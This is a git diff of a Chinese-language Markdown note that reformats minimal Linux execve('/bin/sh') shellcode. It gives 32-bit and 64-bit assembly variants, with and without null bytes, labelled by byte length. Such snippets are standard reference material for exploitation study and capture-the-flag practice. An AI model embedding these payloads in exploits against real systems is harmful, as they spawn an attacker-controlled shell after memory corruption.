@@ -17,78 +17,84 @@ tags:
 ## 32位
 
 有"\x00"最短 20 byte
-
-	shellcode= '''
-	xor ecx,ecx
-	mul ecx
-	mov al,0xb
-	push 0x68732f   
-	push 0x6e69622f   
-	mov ebx,esp
-	int 0x80
-	'''
-    shellcode=asm(shellcode)
-
+```python
+shellcode= '''            
+xor ecx,ecx               
+mul ecx                   
+mov al,0xb                
+push 0x68732f             
+push 0x6e69622f           
+mov ebx,esp               
+int 0x80                  
+'''                       
+  shellcode=asm(shellcode)
+```
 无"\x00"最短 21 byte
 
-
-	xor ecx,ecx
-	mul ecx
-	push eax
-	mov al,0xb
-	push 0x68732f2f   
-	push 0x6e69622f   
-	mov ebx,esp
-	int 0x80
-
+```nasm
+xor ecx,ecx
+mul ecx
+push eax
+mov al,0xb
+push 0x68732f2f   
+push 0x6e69622f   
+mov ebx,esp
+int 0x80
+```
 
 标准shellcode 23 byte
-
-	xor ecx,ecx
-	xor edx,edx
-	push edx
-	push 0x68732f2f
-	push 0x6e69622f
-	mov ebx,esp
-	xor eax,eax
-	mov al,0xB
-	int 0x80
-
+```nasm
+xor ecx,ecx
+xor edx,edx
+push edx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx,esp
+xor eax,eax
+mov al,0xB
+int 0x80
+```
 ## 64位
 
 
 最短有"\x00" 22 byte
 
-	xor rsi,rsi
-	mul esi
-	mov rbx,0x68732f6e69622f
-	push rbx
-	push rsp
-	pop rdi
-	mov al, 59
-	syscall
+```nasm
+xor rsi,rsi
+mul esi
+mov rbx,0x68732f6e69622f
+push rbx
+push rsp
+pop rdi
+mov al, 59
+syscall
+```
 
 最短无"\x00" 23 byte
 
-	xor rsi,rsi
-	mul esi
-	push rax
-	mov rbx,0x68732f2f6e69622f
-	push rbx
-	push rsp
-	pop rdi
-	mov al, 59
-	syscall
+```nasm
+xor rsi,rsi
+mul esi
+push rax
+mov rbx,0x68732f2f6e69622f
+push rbx
+push rsp
+pop rdi
+mov al, 59
+syscall
+```
 
 标准shellcode 31 byte
 
-	xor    rdi,rdi
-	xor    rsi,rsi
-	xor    rdx,rdx
-	xor    rax,rax
-	push   rax
-	mov rbx,0x68732f2f6e69622f
-	push   rbx
-	mov    rdi,rsp
-	mov    al,0x3b
-	syscall 
+```nasm
+xor    rdi,rdi
+xor    rsi,rsi
+xor    rdx,rdx
+xor    rax,rax
+push   rax
+mov rbx,0x68732f2f6e69622f
+push   rbx
+mov    rdi,rsp
+mov    al,0x3b
+syscall 
+```
